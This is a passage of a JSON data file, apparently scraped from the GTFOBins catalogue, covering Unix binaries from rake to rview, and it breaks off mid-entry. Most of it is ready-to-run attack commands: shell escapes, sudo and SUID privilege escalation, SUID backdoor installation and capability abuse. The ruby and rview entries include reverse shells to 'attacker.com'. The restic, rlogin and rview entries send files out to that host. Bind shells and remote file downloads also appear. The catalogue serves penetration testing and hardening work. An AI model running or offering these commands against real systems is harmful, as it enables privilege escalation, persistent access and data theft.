                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "rake -p '`/bin/sh 1>&0`'"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "The file is actually parsed and the first wrong line is returned in an error message.",
                        "code": "LFILE=file-to-read\nrake -f $LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo rake -p '`/bin/sh 1>&0`'"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which rake) .\n\n./rake -p '`/bin/sh 1>&0`'"
                    }
                ]
            }
        ]
    },
    {
        "name": "rc",
        "url": "https://gtfobins.github.io/gtfobins/rc/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "rc -c '/bin/sh'"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which rc) .\n\n./rc -c '/bin/sh -p'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo rc -c '/bin/sh'"
                    }
                ]
            }
        ]
    },
    {
        "name": "readelf",
        "url": "https://gtfobins.github.io/gtfobins/readelf/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nreadelf -a @$LFILE"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which readelf) .\n\nLFILE=file_to_read\n./readelf -a @$LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo readelf -a @$LFILE"
                    }
                ]
            }
        ]
    },
    {
        "name": "red",
        "url": "https://gtfobins.github.io/gtfobins/red/",
        "functions": [
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "red file_to_write\na\nDATA\n.\nw\nq"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "red file_to_read\n,p\nq"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo red file_to_write\na\nDATA\n.\nw\nq"
                    }
                ]
            }
        ]
    },
    {
        "name": "redcarpet",
        "url": "https://gtfobins.github.io/gtfobins/redcarpet/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nredcarpet \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo redcarpet \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "redis",
        "url": "https://gtfobins.github.io/gtfobins/redis/",
        "functions": [
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "Write files on the server running Redis at the specified location. Written data will appear amongst the database dump, thus it might not be suitable for all kind of purposes.",
                        "code": "IP=127.0.0.1\nredis-cli -h $IP\nconfig set dir dir_to_write_to\nconfig set dbfilename file_to_write\nset x \"DATA\"\nsave"
                    }
                ]
            }
        ]
    },
    {
        "name": "restic",
        "url": "https://gtfobins.github.io/gtfobins/restic/",
        "functions": [
            {
                "function": "Info",
                "description": "The attacker must setup a server to receive the backups, in the following example rest-server is used but there are other options. To start a new instance and create a new repository:",
                "examples": [
                    {
                        "sub_description": "",
                        "code": "RPORT=12345\nNAME=backup_name\n./rest-server --listen \":$RPORT\"\nrestic init -r \"rest:http://localhost:$RPORT/$NAME\""
                    },
                    {
                        "sub_description": "To extract the data from the restic repository in the current directory on the attacker side:",
                        "code": "restic restore -r \"/tmp/restic/$NAME\" latest --target ."
                    },
                    {
                        "sub_description": "Upload data to the attacker server with the following commands."
                    }
                ]
            },
            {
                "function": "File upload",
                "description": "It can exfiltrate files on the network.",
                "examples": [
                    {
                        "description": "",
                        "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\nrestic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which restic) .\n\nRHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\n./restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\nsudo restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "rev",
        "url": "https://gtfobins.github.io/gtfobins/rev/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nrev $LFILE | rev"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which rev) .\n\nLFILE=file_to_read\n./rev $LFILE | rev"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo rev $LFILE | rev"
                    }
                ]
            }
        ]
    },
    {
        "name": "rlogin",
        "url": "https://gtfobins.github.io/gtfobins/rlogin/",
        "functions": [
            {
                "function": "Info",
                "description": "Usually rlogin is a symlink to ssh, the following works only when the real rlogin is used (e.g., from the rsh-client APT package)."
            },
            {
                "function": "File upload",
                "description": "It can exfiltrate files on the network.",
                "examples": [
                    {
                        "description": "Send contents of a file to a TCP port. Run nc -l -p 12345 > \"file_to_save\" on the attacker system to capture the contents.",
                        "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nrlogin -l \"$(cat $LFILE)\" -p $RPORT $RHOST"
                    }
                ]
            }
        ]
    },
    {
        "name": "rlwrap",
        "url": "https://gtfobins.github.io/gtfobins/rlwrap/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "rlwrap /bin/sh"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "This adds timestamps to the output file. This relies on the external echo command.",
                        "code": "LFILE=file_to_write\nrlwrap -l \"$LFILE\" echo DATA"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which rlwrap) .\n\n./rlwrap -H /dev/null /bin/sh -p"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo rlwrap /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "rpm",
        "url": "https://gtfobins.github.io/gtfobins/rpm/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "rpm --eval '%{lua:os.execute(\"/bin/sh\")}'"
                    },
                    {
                        "description": "",
                        "code": "rpm --pipe '/bin/sh 0<&1'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo rpm --eval '%{lua:os.execute(\"/bin/sh\")}'"
                    },
                    {
                        "description": "It runs commands using a specially crafted RPM package. Generate it with fpm and upload it to the target.",
                        "code": "TF=$(mktemp -d)\necho 'id' > $TF/x.sh\nfpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which rpm) .\n\n./rpm --eval '%{lua:os.execute(\"/bin/sh\")}'"
                    }
                ]
            }
        ]
    },
    {
        "name": "rpmdb",
        "url": "https://gtfobins.github.io/gtfobins/rpmdb/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "rpmdb --eval '%(/bin/sh 1>&2)'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo rpmdb --eval '%(/bin/sh 1>&2)'"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which rpmdb) .\n\n./rpmdb --eval '%(/bin/sh 1>&2)'"
                    }
                ]
            }
        ]
    },
    {
        "name": "rpmquery",
        "url": "https://gtfobins.github.io/gtfobins/rpmquery/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "rpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo rpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which rpmquery) .\n\n./rpmquery --eval '%{lua:os.execute(\"/bin/sh\")}'"
                    }
                ]
            }
        ]
    },
    {
        "name": "rpmverify",
        "url": "https://gtfobins.github.io/gtfobins/rpmverify/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "rpmverify --eval '%(/bin/sh 1>&2)'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo rpmverify --eval '%(/bin/sh 1>&2)'"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which rpmverify) .\n\n./rpmverify --eval '%(/bin/sh 1>&2)'"
                    }
                ]
            }
        ]
    },
    {
        "name": "rsync",
        "url": "https://gtfobins.github.io/gtfobins/rsync/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which rsync) .\n\n./rsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"
                    }
                ]
            }
        ]
    },
    {
        "name": "rtorrent",
        "url": "https://gtfobins.github.io/gtfobins/rtorrent/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "echo \"execute = /bin/sh,-c,\\\"/bin/sh <$(tty) >$(tty) 2>$(tty)\\\"\" >~/.rtorrent.rc\nrtorrent"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which rtorrent) .\n\necho \"execute = /bin/sh,-p,-c,\\\"/bin/sh -p <$(tty) >$(tty) 2>$(tty)\\\"\" >~/.rtorrent.rc\n./rtorrent"
                    }
                ]
            }
        ]
    },
    {
        "name": "ruby",
        "url": "https://gtfobins.github.io/gtfobins/ruby/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "ruby -e 'exec \"/bin/sh\"'"
                    }
                ]
            },
            {
                "function": "Reverse shell",
                "description": "It can send back a reverse shell to a listening attacker to open a remote network access.",
                "examples": [
                    {
                        "description": "Run nc -l -p 12345 on the attacker box to receive the shell.",
                        "code": "export RHOST=attacker.com\nexport RPORT=12345\nruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV[\"RHOST\"],ENV[\"RPORT\"]);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
                    }
                ]
            },
            {
                "function": "File upload",
                "description": "It can exfiltrate files on the network.",
                "examples": [
                    {
                        "description": "Serve files in the local folder running an HTTP server. This requires version 1.9.2 or later.",
                        "code": "export LPORT=8888\nruby -run -e httpd . -p $LPORT"
                    }
                ]
            },
            {
                "function": "File download",
                "description": "It can download remote files.",
                "examples": [
                    {
                        "description": "Fetch a remote file via HTTP GET request.",
                        "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nruby -e 'require \"open-uri\"; download = open(ENV[\"URL\"]); IO.copy_stream(download, ENV[\"LFILE\"])'"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "ruby -e 'File.open(\"file_to_write\", \"w+\") { |f| f.write(\"DATA\") }'"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "ruby -e 'puts File.read(\"file_to_read\")'"
                    }
                ]
            },
            {
                "function": "Library load",
                "description": "It loads shared libraries that may be used to run code in the binary execution context.",
                "examples": [
                    {
                        "description": "",
                        "code": "ruby -e 'require \"fiddle\"; Fiddle.dlopen(\"lib.so\")'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo ruby -e 'exec \"/bin/sh\"'"
                    }
                ]
            },
            {
                "function": "Capabilities",
                "description": "If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.",
                "examples": [
                    {
                        "description": "",
                        "code": "cp $(which ruby) .\nsudo setcap cap_setuid+ep ruby\n\n./ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'"
                    }
                ]
            }
        ]
    },
    {
        "name": "run-mailcap",
        "url": "https://gtfobins.github.io/gtfobins/run-mailcap/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "This invokes the default pager, which is likely to be less, other functions may apply.",
                        "code": "run-mailcap --action=view /etc/hosts\n!/bin/sh"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "The file must exist and be not empty.",
                        "code": "run-mailcap --action=edit file_to_read"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "This invokes the default pager, which is likely to be less, other functions may apply.",
                        "code": "run-mailcap --action=view file_to_read"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "This invokes the default pager, which is likely to be less, other functions may apply.",
                        "code": "sudo run-mailcap --action=view /etc/hosts\n!/bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "run-parts",
        "url": "https://gtfobins.github.io/gtfobins/run-parts/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "run-parts --new-session --regex '^sh$' /bin"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which run-parts) .\n\n./run-parts --new-session --regex '^sh$' /bin --arg='-p'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo run-parts --new-session --regex '^sh$' /bin"
                    }
                ]
            }
        ]
    },
    {
        "name": "runscript",
        "url": "https://gtfobins.github.io/gtfobins/runscript/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp)\necho '! exec /bin/sh' >$TF\nrunscript $TF"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp)\necho '! exec /bin/sh' >$TF\nsudo runscript $TF"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which runscript) .\n\nTF=$(mktemp)\necho '! exec /bin/sh' >$TF\n./runscript $TF"
                    }
                ]
            }
        ]
    },
    {
        "name": "rview",
        "url": "https://gtfobins.github.io/gtfobins/rview/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "This requires that rview is compiled with Python support. Prepend :py3 for Python 3.",
                        "code": "rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
                    },
                    {
                        "description": "This requires that rview is compiled with Lua support.",
                        "code": "rview -c ':lua os.execute(\"reset; exec sh\")'"
                    }
                ]
            },
            {
                "function": "Reverse shell",
                "description": "It can send back a reverse shell to a listening attacker to open a remote network access.",
                "examples": [
                    {
                        "description": "This requires that rview is compiled with Python support. Prepend :py3 for Python 3. Run socat file:`tty`,raw,echo=0 tcp-listen:12345 on the attacker box to receive the shell.",
                        "code": "export RHOST=attacker.com\nexport RPORT=12345\nrview -c ':py import vim,sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")\nvim.command(\":q!\")'"
                    }
                ]
            },
            {
                "function": "Non-interactive reverse shell",
                "description": "It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.",
                "examples": [
                    {
                        "description": "Run nc -l -p 12345 on the attacker box to receive the shell. This requires that rview is compiled with Lua support and that lua-socket is installed.",
                        "code": "export RHOST=attacker.com\nexport RPORT=12345\nrview -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'"
                    }
                ]
            },
            {
                "function": "Non-interactive bind shell",
                "description": "It can bind a non-interactive shell to a local port to allow remote network access.",
                "examples": [
                    {
                        "description": "Run nc target.com 12345 on the attacker box to connect to the shell. This requires that rview is compiled with Lua support and that lua-socket is installed.",
                        "code": "export LPORT=12345\nrview -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'"
                    }
                ]
            },
            {
                "function": "File upload",
                "description": "It can exfiltrate files on the network.",
                "examples": [
                    {
                        "description": "This requires that rview is compiled with Python support. Prepend :py3 for Python 3. Send local file via “d” parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.",
                        "code": "export URL=http://attacker.com/\nexport LFILE=file_to_send\nrview -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))\nvim.command(\":q!\")'"
                    },
                    {
                        "description": "This requires that rview is compiled with Python support. Prepend :py3 for Python 3. Serve files in the local folder running an HTTP server.",
                        "code": "export LPORT=8888\nrview -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()\nvim.command(\":q!\")'"
                    },
                    {
                        "description": "Send a local file via TCP. Run nc -l -p 12345 > \"file_to_save\" on the attacker box to collect the file. This requires that rview is compiled with Lua support and that lua-socket is installed.",
                        "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nrview -c ':lua local f=io.open(os.getenv(\"LFILE\"), 'rb')\n  local d=f:read(\"*a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  t:send(d);\n  t:close();'"
                    }
                ]
            },
            {
                "function": "File download",
                "description": "It can download remote files.",
                "examples": [
                    {
                        "description": "This requires that rview is compiled with Python support. Prepend :py3 for Python 3. Fetch a remote file via HTTP GET request.",
                        "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nrview -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])\nvim.command(\":q!\")'"
                    },
                    {
                        "description": "Fetch a remote file via TCP. Run nc target.com 12345 < \"file_to_send\" on the attacker box to send the file. This requires that rview is compiled with Lua support and that lua-socket is installed.",
                        "code": "export LPORT=12345\nexport LFILE=file_to_save\nrview -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(os.getenv(\"LFILE\"), \"wb\");\n  f:write(d);\n  io.close(f);'"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "rview file_to_write\niDATA\n^[\nw!"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "rview file_to_read"
                    }
                ]
            },
            {
                "function": "Library load",
                "description": "It loads shared libraries that may be used to run code in the binary execution context.",
                "examples": [
                    {
